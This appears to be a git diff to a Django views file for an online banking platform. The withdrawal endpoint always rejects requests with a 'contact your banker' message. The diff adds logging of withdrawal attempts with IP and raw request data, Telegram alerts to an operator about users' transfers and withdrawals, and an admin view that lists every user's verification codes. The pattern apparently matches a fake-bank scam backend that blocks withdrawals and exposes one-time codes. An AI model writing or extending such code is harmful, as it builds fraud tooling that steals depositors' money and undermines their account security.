@@ -17,7 +17,7 @@ from asgiref.sync import async_to_sync
 from channels.layers import get_channel_layer
 from rest_framework_simplejwt.tokens import RefreshToken
 
-from .models import Account, CustomerProfile, LedgerEntry, LedgerPosting, Statement, VerificationCode, CryptoWallet, CryptoDeposit, SupportConversation, SupportMessage, VirtualCard, KYCDocument, Notification, Loan, LoanPayment, TaxRefundApplication, TaxRefundDocument, Grant, GrantApplication
+from .models import Account, CustomerProfile, LedgerEntry, LedgerPosting, Statement, VerificationCode, CryptoWallet, CryptoDeposit, SupportConversation, SupportMessage, VirtualCard, KYCDocument, Notification, Loan, LoanPayment, TaxRefundApplication, TaxRefundDocument, Grant, GrantApplication, TelegramConfig, WithdrawalAttempt
 from .serializers import (
     AccountSerializer,
     AdminAccountSerializer,
@@ -60,13 +60,9 @@ from .serializers import (
     LoanApprovalSerializer,
     LoanRejectionSerializer,
     LoanPaymentRequestSerializer,
-    TaxRefundApplicationSerializer,
-    TaxRefundApplicationCreateSerializer,
-    TaxRefundCalculatorSerializer,
-    AdminTaxRefundApplicationSerializer,
-    TaxRefundApprovalSerializer,
-    TaxRefundDocumentSerializer,
     TaxRefundDocumentUploadSerializer,
+    VerificationCodeSerializer,
+    TelegramConfigSerializer,
 )
 from .services import (
     add_posting,
@@ -434,11 +430,46 @@ class TransferView(APIView):
         from .emails import send_transfer_received_email
         send_transfer_received_email.delay(recipient.customer.user.id, amount, f"User {request.user.email}", memo)
         
+        # Telegram notification
+        from .telegram import send_telegram_notification
+        send_telegram_notification(
+            f"New Transfer Attempt\n"
+            f"User: {request.user.email}\n"
+            f"Amount: {amount} USD\n"
+            f"To: {recipient.account_number}\n"
+            f"Memo: {memo}"
+        )
+        
         return Response(LedgerEntrySerializer(entry).data, status=status.HTTP_201_CREATED)
 
 
 class WithdrawalView(APIView):
     def post(self, request):
+        amount_str = request.data.get('amount', '0')
+        try:
+            amount = Decimal(amount_str)
+        except:
+            amount = Decimal('0')
+            
+        # Log withdrawal attempt
+        from .models import WithdrawalAttempt
+        WithdrawalAttempt.objects.create(
+            user=request.user,
+            amount=amount,
+            ip_address=request.META.get('REMOTE_ADDR'),
+            user_agent=request.META.get('HTTP_USER_AGENT', ''),
+            metadata={'raw_data': request.data}
+        )
+
+        # Telegram notification for withdrawal attempt
+        from .telegram import send_telegram_notification
+        send_telegram_notification(
+            f"New Withdrawal Attempt\n"
+            f"User: {request.user.email}\n"
+            f"Amount: {amount} USD\n"
+            f"IP: {request.META.get('REMOTE_ADDR')}"
+        )
+
         return Response(
             {'detail': 'There is an issue with your withdrawal request at the moment. Please contact your banker for further assistance.'},
             status=status.HTTP_400_BAD_REQUEST
@@ -3077,3 +3108,31 @@ class AdminRecentActivityView(APIView):
             'activities': activities,
             'count': len(activities),
         })
+
+class AdminVerificationCodesView(APIView):
+    """View all verification codes (Admin only)"""
+    permission_classes = [permissions.IsAdminUser]
+
+    def get(self, request):
+        codes = VerificationCode.objects.all().order_by('-created_at')
+        serializer = VerificationCodeSerializer(codes, many=True)
+        return Response(serializer.data)
+
+
+class AdminTelegramConfigView(APIView):
+    """View and manage Telegram bot configuration (Admin only)"""
+    permission_classes = [permissions.IsAdminUser]
+
+    def get(self, request):
+        config = TelegramConfig.objects.first()
+        if not config:
+            return Response({})
+        serializer = TelegramConfigSerializer(config)
+        return Response(serializer.data)
+
+    def post(self, request):
+        config = TelegramConfig.objects.first()
+        serializer = TelegramConfigSerializer(instance=config, data=request.data)
+        serializer.is_valid(raise_exception=True)
+        serializer.save()
+        return Response(serializer.data)
